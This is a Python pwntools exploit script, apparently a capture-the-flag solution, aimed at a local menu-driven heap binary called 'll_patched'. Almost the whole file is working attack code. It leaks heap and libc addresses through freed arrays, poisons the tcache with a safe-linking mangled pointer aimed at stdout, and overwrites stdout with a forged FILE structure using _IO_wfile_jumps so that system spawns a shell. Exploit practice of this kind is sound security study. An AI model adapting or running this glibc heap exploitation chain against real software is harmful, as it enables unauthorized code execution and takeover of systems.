#!/usr/bin/env python3

from pwn import *

exe = ELF('./ll_patched')
libc = ELF('./libc.so.6')
context.binary = exe

s = lambda a: p.send(a)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
sla = lambda a, b: p.sendlineafter(a, b)
lleak = lambda a, b: log.info(a + " = %#x" % b)
rcu = lambda a: p.recvuntil(a)
debug = lambda : gdb.attach(p, gdbscript = script)

def add_arr(id, cnt, arr):
	sla(b"choice: ", b"1")
	sla(b"ID: ", f"{id}".encode())
	sla(b"input? ", f"{cnt}".encode())
	for e in arr:
		sl(f"{e}".encode())

def del_arr(id):
	sla(b"choice: ", b"2")
	sla(b"ID: ", f"{id}".encode())

def view_arr(id):
	sla(b"choice: ", b"3")
	sla(b"ID: ", f"{id}".encode())

def edit_arr(id, arr):
	sla(b"choice: ", b"4")
	sla(b"ID: ", f"{id}".encode())
	for e in arr:
		sl(f"{e}".encode())

def add_name(index, size, data):
	sla(b"choice: ", b"5")
	sla(b"Index: ", f"{index}".encode())
	sla(b"Size: ", f"{size}".encode())
	s(data)

def del_name(index):
	sla(b"choice: ", b"6")
	sla(b"Index: ", f"{index}".encode())

script = '''
# scanf choice
brva 0x14D0
'''

p = process('./ll_patched')
#p = gdb.debug('./ll_patched', gdbscript = script)

add_arr(0, 2, [0] * 2)
add_arr(1, 2, [1] * 2)

# leak libc
del_arr(0)
add_arr(0, 2, [0] * 2)
del_arr(1)
view_arr(1)
rcu(b"is: ")
heap_base = (int(p.recvline(), 16)) << 12
lleak("heap_base", heap_base)

# restore the fake num_arr chunk
## delete the next_ptr to prevent endless loop
## set fake key to interact
add_name(0, 0x218, b"A" * 0x1f0 + p32(1) + p32(2) + p64(0))

# leak libc
for i in range(2, 8):
	add_arr(i, 2, [i] * 2)
add_name(1, 0x18, b"B" * 8) # prevent consolidation
for i in range(6, -1, -1):
	del_arr(i)
del_arr(7)
add_arr(0, 2, [0] * 2)
view_arr(7)
rcu(b"is: ")
libc_base = int(p.recvline(), 16) - 0x203b20
lleak("libc_base", libc_base)

# tcache poisoning to stdout
_IO_2_1_stdout_ = libc_base + libc.symbols['_IO_2_1_stdout_']
add_arr(1, 1, [1] * 1)
del_name(0)
add_name(0, 0x218, b"A" * 0x1f0 + p32(1) + p32(1) + p64(0)) # restore fake chunk
del_name(0)
mangle = (_IO_2_1_stdout_ - 0x10) ^ (heap_base + 0x700) >> 12
edit_arr(1, [mangle])
#debug()
add_arr(1, 2, [1] * 2)

# fsop
_IO_2_1_stdout_ = libc_base + libc.symbols['_IO_2_1_stdout_']
system = libc_base + libc.symbols['system']
fp = FileStructure(0)
fp.flags = 0xfbad2484 + (u32(b"||sh") << 32)
fp._IO_read_end = system
fp._lock = _IO_2_1_stdout_ + 0x50
fp._wide_data = _IO_2_1_stdout_ - 0x10
fp.unknown2 =  p64(0) * 3 + p64(0xffffffff) + p64(0) + p64(_IO_2_1_stdout_ + 0x10 - 0x68)
fp.vtable = libc_base  + libc.symbols['_IO_wfile_jumps'] - 0x20
payload = bytes(fp)
add_name(0, 0x218, payload)

p.interactive()
